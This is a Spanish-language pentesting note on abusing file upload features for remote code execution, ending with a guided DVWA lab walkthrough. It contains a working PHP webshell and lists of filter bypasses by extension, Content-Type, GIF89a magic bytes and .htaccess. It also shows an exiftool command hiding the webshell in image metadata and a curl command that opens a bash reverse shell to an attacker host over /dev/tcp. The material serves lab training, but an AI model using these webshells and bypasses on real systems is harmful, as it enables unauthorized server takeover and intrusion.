# Subida de Archivos (File Upload)

Una funcionalidad de **subida de archivos** mal validada es una de las vías más directas a **RCE**: si consigues subir una webshell (un `.php`, `.aspx`, `.jsp`...) y luego acceder a ella, ejecutas comandos en el servidor.

---

## El objetivo

Subir un archivo que el servidor **ejecute** como código. El caso más típico es PHP:

```php
<?php system($_GET['cmd']); ?>
```

Y luego acceder a `http://<IP>/uploads/shell.php?cmd=id`.

> **Consejo:** antes de subir nada, averigua **dónde** se guardan los archivos (fuzzing: `/uploads`, `/files`, `/images`, `/avatars`) y con **qué tecnología** corre la web (PHP, ASP.NET, JSP), para elegir la extensión que el servidor ejecutará.

---

## Bypass de validaciones

Las webs filtran de varias formas; cada una tiene su bypass.

### 1. Filtro por extensión (lista negra)

Prueba extensiones alternativas que el servidor siga ejecutando como PHP:

```text
.php3  .php4  .php5  .php7  .phtml  .phps  .pht  .phar
.PHP   .pHp                  (mayúsculas mezcladas)
shell.php.jpg                (doble extensión)
shell.php%00.jpg             (null byte, versiones antiguas)
shell.php.                   (punto final)
shell.php;.jpg
```

Para ASP/.NET: `.asp .aspx .cer .asa .shtml`. Para JSP: `.jsp .jspx .jsw`.

### 2. Filtro por Content-Type (cabecera)

Intercepta con Burp y cambia el `Content-Type` del archivo a uno permitido:

```http
Content-Type: image/jpeg      ← aunque el archivo sea PHP
```

### 3. Filtro por "magic bytes" (contenido real)

El servidor comprueba que el archivo "parezca" una imagen. Añade la firma de imagen al principio del PHP:

```text
GIF89a;
<?php system($_GET['cmd']); ?>
```

`GIF89a` es la cabecera de un GIF; el intérprete PHP ignora el texto previo y ejecuta el `<?php ...?>`.

### 4. `.htaccess` (Apache)

Si puedes subir un `.htaccess`, fuerza a que una extensión inocente se ejecute como PHP:

```apache
AddType application/x-httpd-php .jpg
```

Luego subes `shell.jpg` con código PHP y se ejecuta.

---

## Webshell dentro de imágenes y metadatos

Esconde el código en los metadatos EXIF de una imagen real (útil cuando el servidor procesa imágenes):

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' foto.jpg -o shell.php.jpg
```

---

## Tras subir la shell

```bash
# Localiza la ruta y ejecuta
curl "http://<IP>/uploads/shell.php?cmd=id"
# Lanza una reverse shell (ver Técnicas · Shells y TTY)
curl "http://<IP>/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/443+0>%261'"
```

---

## Si no hay ejecución (SVG/XXE, XSS almacenado)

Aunque no logres RCE, una subida puede dar otros frutos:

- **SVG** → XSS almacenado o XXE (ver [XXE](../APIs/Vulnerabilidades/XXE.md)).
- **HTML** → XSS almacenado.
- **Path traversal en el nombre** (`../../`) → sobrescribir archivos.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `Burp Suite` | Interceptar y manipular Content-Type, extensión y contenido. |
| `exiftool` | Inyectar payloads en metadatos de imágenes. |
| `ffuf` | Localizar el directorio de subidas. |
| `weevely` | Generar webshells PHP ofuscadas. |

---

> **Consejo:** el flujo es: identificar tecnología y carpeta de subida → intentar subir una webshell → si hay filtro, atacar el punto débil (extensión, Content-Type o magic bytes) → acceder a la shell y saltar a reverse shell. El combo **`GIF89a` + doble extensión + Content-Type falso** supera la mayoría de validaciones de los labs.

---

## Dónde practicar la subida de archivos

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — File upload vulnerabilities | Labs gratis | https://portswigger.net/web-security/file-upload |
| DVWA — File Upload | Descargable (Docker) | https://github.com/digininja/DVWA |
| OWASP Juice Shop | Descargable (Docker) | https://github.com/juice-shop/juice-shop |
| TryHackMe — "Upload Vulnerabilities" | Sala guiada | https://tryhackme.com |
| VulnHub / DockerLabs | Máquinas completas | https://www.vulnhub.com · https://dockerlabs.es |

## Writeup guiado: File Upload en DVWA (nivel Low → Medium)

```flow
Preparar :: DVWA en Docker, sección File Upload.
Subir shell :: En Low, un .php directo.
Localizar :: La ruta donde se guarda el archivo.
Ejecutar :: Acceder a la webshell y lanzar la reverse shell.
Saltar filtros :: En Medium, falsear el Content-Type.
```

### Paso 1 — Preparar y subir (Low)

En DVWA (seguridad **Low**) ve a **File Upload**. Crea `shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

Súbelo: en Low no hay filtro y se acepta tal cual.

### Paso 2 — Localizar y ejecutar

DVWA indica la ruta (`../../hackable/uploads/shell.php`). Accede:

```bash
curl "http://localhost/hackable/uploads/shell.php?cmd=id"
```

Lanza la reverse shell como en las otras notas.

### Paso 3 — Saltar el filtro (Medium)

Medium valida el `Content-Type`. Intercepta la subida con **Burp** y cambia la cabecera del archivo a `image/jpeg` manteniendo el contenido PHP. En High, añade los *magic bytes* `GIF89a;` al principio y usa doble extensión / `.phtml`.

> **Consejo:** el combo **`GIF89a` + Content-Type falso + extensión alternativa** (`.phtml`, `.php5`) supera la mayoría de validaciones de los labs. Si no puedes ejecutar PHP, prueba `.htaccess` para forzar la ejecución de otra extensión.
